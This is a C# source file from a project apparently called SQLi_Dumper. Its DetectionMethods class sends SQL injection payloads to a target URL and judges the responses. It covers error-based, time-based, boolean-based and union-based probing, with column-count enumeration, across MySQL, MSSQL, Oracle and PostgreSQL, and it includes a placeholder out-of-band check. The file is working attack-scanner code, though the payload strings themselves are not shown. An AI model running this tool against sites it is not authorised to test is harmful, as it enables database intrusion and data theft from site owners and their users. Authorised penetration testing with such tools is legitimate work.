using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading;
using System.Threading.Tasks;
using DataBase;

namespace SQLi_Dumper
{
    /// <summary>
    /// Advanced detection methods for SQL injection testing
    /// </summary>
    public class DetectionMethods
    {
        private readonly HTTPExt _httpExt;
        private readonly PayloadManager _payloadManager;
        private readonly ErrorSignatures _errorSignatures;

        public DetectionMethods(HTTPExt httpExt)
        {
            _httpExt = httpExt;
            _payloadManager = PayloadManager.Instance;
            _errorSignatures = ErrorSignatures.Instance;
        }

        public class DetectionResult
        {
            public bool IsVulnerable { get; set; }
            public Types DatabaseType { get; set; }
            public InjectionFormat VectorType { get; set; }
            public DetectionMethod Method { get; set; }
            public string Payload { get; set; }
            public string Evidence { get; set; }
            public int ConfidenceScore { get; set; }
            public long ResponseTime { get; set; }
            public string ErrorMessage { get; set; }
        }

        public enum DetectionMethod
        {
            ErrorBased,
            TimeBased,
            BooleanBased,
            UnionBased,
            OutOfBand
        }

        /// <summary>
        /// Performs comprehensive vulnerability detection using multiple methods
        /// </summary>
        public async Task<DetectionResult> PerformFullDetection(string url, CancellationToken cancellationToken = default(CancellationToken))
        {
            var results = new List<DetectionResult>();

            // Test different injection formats
            var formats = new[] { InjectionFormat.String, InjectionFormat.Integer };

            foreach (var format in formats)
            {
                if (cancellationToken.IsCancellationRequested)
                    break;

                // Try different detection methods
                results.AddRange(await TestErrorBasedDetection(url, format, cancellationToken));
                results.AddRange(await TestTimeBasedDetection(url, format, cancellationToken));
                results.AddRange(await TestBooleanBasedDetection(url, format, cancellationToken));
                results.AddRange(await TestUnionBasedDetection(url, format, cancellationToken));
            }

            // Return the best result
            DetectionResult bestResult = null;
            int highestConfidence = 0;

            foreach (var result in results)
            {
                if (result.IsVulnerable && result.ConfidenceScore > highestConfidence)
                {
                    highestConfidence = result.ConfidenceScore;
                    bestResult = result;
                }
            }

            return bestResult ?? new DetectionResult();
        }

        /// <summary>
        /// Tests for error-based SQL injection vulnerabilities
        /// </summary>
        public async Task<List<DetectionResult>> TestErrorBasedDetection(string url, InjectionFormat format, CancellationToken cancellationToken = default(CancellationToken))
        {
            var results = new List<DetectionResult>();
            var dbTypes = new[] { Types.MySQL_With_Error, Types.MSSQL_With_Error, Types.Oracle_With_Error, Types.PostgreSQL_With_Error };

            foreach (var dbType in dbTypes)
            {
                if (cancellationToken.IsCancellationRequested)
                    break;

                var payloads = _payloadManager.GetPayloads(PayloadManager.PayloadCategory.ErrorBased, dbType);
                
                foreach (var payload in payloads)
                {
                    if (cancellationToken.IsCancellationRequested)
                        break;

                    // Skip payload if it doesn't match the injection format
                    if (format == InjectionFormat.Integer && payload.Contains("'"))
                        continue;
                    if (format == InjectionFormat.String && !payload.Contains("'"))
                        continue;

                    var testUrl = url.Replace("[t]", payload);
                    var stopwatch = Stopwatch.StartNew();
                    
                    try
                    {
                        var response = await Task.Run(() => _httpExt.QuickGet(testUrl), cancellationToken);
                        stopwatch.Stop();

                        if (response != null)
                        {
                            var errorResult = _errorSignatures.AnalyzeResponse(response.ToString());
                            
                            if (errorResult.ConfidenceScore > 70)
                            {
                                results.Add(new DetectionResult
                                {
                                    IsVulnerable = true,
                                    DatabaseType = errorResult.DatabaseType,
                                    VectorType = format,
                                    Method = DetectionMethod.ErrorBased,
                                    Payload = payload,
                                    Evidence = string.Join(", ", errorResult.MatchedSignatures),
                                    ConfidenceScore = errorResult.ConfidenceScore,
                                    ResponseTime = stopwatch.ElapsedMilliseconds,
                                    ErrorMessage = errorResult.ErrorMessage
                                });
                            }
                        }
                    }
                    catch (Exception)
                    {
                        // Continue with next payload
                    }
                }
            }

            return results;
        }

        /// <summary>
        /// Tests for time-based blind SQL injection vulnerabilities
        /// </summary>
        public async Task<List<DetectionResult>> TestTimeBasedDetection(string url, InjectionFormat format, CancellationToken cancellationToken = default(CancellationToken))
        {
            var results = new List<DetectionResult>();
            var dbTypes = new[] { Types.MySQL_No_Error, Types.MSSQL_No_Error, Types.Oracle_No_Error, Types.PostgreSQL_No_Error };

            foreach (var dbType in dbTypes)
            {
                if (cancellationToken.IsCancellationRequested)
                    break;

                var payloads = _payloadManager.GetPayloads(PayloadManager.PayloadCategory.TimeBased, dbType);
                
                foreach (var payload in payloads)
                {
                    if (cancellationToken.IsCancellationRequested)
                        break;

                    // Skip payload if it doesn't match the injection format
                    if (format == InjectionFormat.Integer && payload.Contains("'"))
                        continue;
                    if (format == InjectionFormat.String && !payload.Contains("'"))
                        continue;

                    // Test with a condition that should cause delay
                    var delayPayload = payload.Replace("[t]", "1=1");
                    var testUrl = url.Replace("[t]", delayPayload);
                    
                    var stopwatch = Stopwatch.StartNew();
                    
                    try
                    {
                        var response = await Task.Run(() => _httpExt.QuickGet(testUrl), cancellationToken);
                        stopwatch.Stop();

                        // Check if response time indicates time-based injection
                        if (stopwatch.ElapsedMilliseconds > 4000) // Expected delay is 5 seconds
                        {
                            // Verify with a condition that should NOT cause delay
                            var noDelayPayload = payload.Replace("[t]", "1=2");
                            var noDelayUrl = url.Replace("[t]", noDelayPayload);
                            
                            var verifyStopwatch = Stopwatch.StartNew();
                            var verifyResponse = await Task.Run(() => _httpExt.QuickGet(noDelayUrl), cancellationToken);
                            verifyStopwatch.Stop();

                            // If there's a significant time difference, it's likely time-based injection
                            if (verifyStopwatch.ElapsedMilliseconds < stopwatch.ElapsedMilliseconds - 3000)
                            {
                                results.Add(new DetectionResult
                                {
                                    IsVulnerable = true,
                                    DatabaseType = dbType,
                                    VectorType = format,
                                    Method = DetectionMethod.TimeBased,
                                    Payload = payload,
                                    Evidence = $"Time difference: {stopwatch.ElapsedMilliseconds - verifyStopwatch.ElapsedMilliseconds}ms",
                                    ConfidenceScore = 90,
                                    ResponseTime = stopwatch.ElapsedMilliseconds
                                });
                            }
                        }
                    }
                    catch (Exception)
                    {
                        // Continue with next payload
                    }
                }
            }

            return results;
        }

        /// <summary>
        /// Tests for boolean-based blind SQL injection vulnerabilities
        /// </summary>
        public async Task<List<DetectionResult>> TestBooleanBasedDetection(string url, InjectionFormat format, CancellationToken cancellationToken = default(CancellationToken))
        {
            var results = new List<DetectionResult>();
            var dbTypes = new[] { Types.MySQL_No_Error, Types.MSSQL_No_Error, Types.Oracle_No_Error, Types.PostgreSQL_No_Error };

            foreach (var dbType in dbTypes)
            {
                if (cancellationToken.IsCancellationRequested)
                    break;

                var payloads = _payloadManager.GetPayloads(PayloadManager.PayloadCategory.BooleanBased, dbType);
                
                foreach (var payload in payloads)
                {
                    if (cancellationToken.IsCancellationRequested)
                        break;

                    // Skip payload if it doesn't match the injection format
                    if (format == InjectionFormat.Integer && payload.Contains("'"))
                        continue;
                    if (format == InjectionFormat.String && !payload.Contains("'"))
                        continue;

                    try
                    {
                        // Test with a condition that should return TRUE
                        var truePayload = payload.Replace("[t]", "1=1");
                        var trueUrl = url.Replace("[t]", truePayload);
                        var trueResponse = await Task.Run(() => _httpExt.QuickGet(trueUrl), cancellationToken);

                        // Test with a condition that should return FALSE
                        var falsePayload = payload.Replace("[t]", "1=2");
                        var falseUrl = url.Replace("[t]", falsePayload);
                        var falseResponse = await Task.Run(() => _httpExt.QuickGet(falseUrl), cancellationToken);

                        if (trueResponse != null && falseResponse != null)
                        {
                            var trueStr = trueResponse.ToString();
                            var falseStr = falseResponse.ToString();

                            // Check for significant differences in response
                            if (trueStr.Length != falseStr.Length || 
                                CalculateSimilarity(trueStr, falseStr) < 0.95)
                            {
                                results.Add(new DetectionResult
                                {
                                    IsVulnerable = true,
                                    DatabaseType = dbType,
                                    VectorType = format,
                                    Method = DetectionMethod.BooleanBased,
                                    Payload = payload,
                                    Evidence = $"Response difference detected (lengths: {trueStr.Length} vs {falseStr.Length})",
                                    ConfidenceScore = 85,
                                    ResponseTime = 0
                                });
                            }
                        }
                    }
                    catch (Exception)
                    {
                        // Continue with next payload
                    }
                }
            }

            return results;
        }

        /// <summary>
        /// Tests for union-based SQL injection vulnerabilities
        /// </summary>
        public async Task<List<DetectionResult>> TestUnionBasedDetection(string url, InjectionFormat format, CancellationToken cancellationToken = default(CancellationToken))
        {
            var results = new List<DetectionResult>();
            var dbTypes = new[] { Types.MySQL_No_Error, Types.MSSQL_No_Error, Types.Oracle_No_Error, Types.PostgreSQL_No_Error };

            foreach (var dbType in dbTypes)
            {
                if (cancellationToken.IsCancellationRequested)
                    break;

                var payloads = _payloadManager.GetPayloads(PayloadManager.PayloadCategory.UnionBased, dbType);
                
                foreach (var payload in payloads)
                {
                    if (cancellationToken.IsCancellationRequested)
                        break;

                    // Skip payload if it doesn't match the injection format
                    if (format == InjectionFormat.Integer && payload.Contains("'"))
                        continue;
                    if (format == InjectionFormat.String && !payload.Contains("'"))
                        continue;

                    // Test with different column counts
                    for (int columns = 1; columns <= 10; columns++)
                    {
                        if (cancellationToken.IsCancellationRequested)
                            break;

                        try
                        {
                            var columnList = new List<string>();
                            for (int i = 1; i <= columns; i++)
                            {
                                columnList.Add(i.ToString());
                            }
                            
                            var testPayload = payload.Replace("[t]", string.Join(",", columnList));
                            var testUrl = url.Replace("[t]", testPayload);
                            
                            var response = await Task.Run(() => _httpExt.QuickGet(testUrl), cancellationToken);

                            if (response != null)
                            {
                                var responseStr = response.ToString();
                                
                                // Check if response contains injected values
                                bool foundInjectedValues = false;
                                foreach (var value in columnList)
                                {
                                    if (responseStr.Contains(value))
                                    {
                                        foundInjectedValues = true;
                                        break;
                                    }
                                }

                                if (foundInjectedValues)
                                {
                                    results.Add(new DetectionResult
                                    {
                                        IsVulnerable = true,
                                        DatabaseType = dbType,
                                        VectorType = format,
                                        Method = DetectionMethod.UnionBased,
                                        Payload = testPayload,
                                        Evidence = $"Union injection successful with {columns} columns",
                                        ConfidenceScore = 95,
                                        ResponseTime = 0
                                    });
                                    break; // Found working column count
                                }
                            }
                        }
                        catch (Exception)
                        {
                            // Continue with next column count
                        }
                    }
                }
            }

            return results;
        }

        /// <summary>
        /// Tests for out-of-band SQL injection vulnerabilities
        /// </summary>
        public async Task<List<DetectionResult>> TestOutOfBandDetection(string url, InjectionFormat format, CancellationToken cancellationToken = default(CancellationToken))
        {
            var results = new List<DetectionResult>();
            var dbTypes = new[] { Types.MySQL_No_Error, Types.MSSQL_No_Error, Types.Oracle_No_Error };

            foreach (var dbType in dbTypes)
            {
                if (cancellationToken.IsCancellationRequested)
                    break;

                var payloads = _payloadManager.GetPayloads(PayloadManager.PayloadCategory.OutOfBand, dbType);
                
                foreach (var payload in payloads)
                {
                    if (cancellationToken.IsCancellationRequested)
                        break;

                    // Skip payload if it doesn't match the injection format
                    if (format == InjectionFormat.Integer && payload.Contains("'"))
                        continue;
                    if (format == InjectionFormat.String && !payload.Contains("'"))
                        continue;

                    try
                    {
                        // Generate unique identifier for this test
                        var testId = Guid.NewGuid().ToString("N").Substring(0, 8);
                        var testPayload = payload.Replace("[t]", $"'test_{testId}'");
                        var testUrl = url.Replace("[t]", testPayload);
                        
                        var response = await Task.Run(() => _httpExt.QuickGet(testUrl), cancellationToken);

                        // For out-of-band detection, we would need to check external resources
                        // This is a placeholder for now
                        if (response != null)
                        {
                            results.Add(new DetectionResult
                            {
                                IsVulnerable = false, // Set to false as we can't verify out-of-band without external infrastructure
                                DatabaseType = dbType,
                                VectorType = format,
                                Method = DetectionMethod.OutOfBand,
                                Payload = testPayload,
                                Evidence = "Out-of-band payload sent (external verification required)",
                                ConfidenceScore = 50,
                                ResponseTime = 0
                            });
                        }
                    }
                    catch (Exception)
                    {
                        // Continue with next payload
                    }
                }
            }

            return results;
        }

        /// <summary>
        /// Calculates similarity between two strings
        /// </summary>
        private double CalculateSimilarity(string str1, string str2)
        {
            if (string.IsNullOrEmpty(str1) || string.IsNullOrEmpty(str2))
                return 0;

            int maxLength = Math.Max(str1.Length, str2.Length);
            if (maxLength == 0)
                return 1;

            int distance = LevenshteinDistance(str1, str2);
            return 1.0 - (double)distance / maxLength;
        }

        /// <summary>
        /// Calculates Levenshtein distance between two strings
        /// </summary>
        private int LevenshteinDistance(string str1, string str2)
        {
            int[,] d = new int[str1.Length + 1, str2.Length + 1];

            for (int i = 0; i <= str1.Length; i++)
                d[i, 0] = i;

            for (int j = 0; j <= str2.Length; j++)
                d[0, j] = j;

            for (int i = 1; i <= str1.Length; i++)
            {
                for (int j = 1; j <= str2.Length; j++)
                {
                    int cost = (str1[i - 1] == str2[j - 1]) ? 0 : 1;
                    d[i, j] = Math.Min(Math.Min(d[i - 1, j] + 1, d[i, j - 1] + 1), d[i - 1, j - 1] + cost);
                }
            }

            return d[str1.Length, str2.Length];
        }
    }
}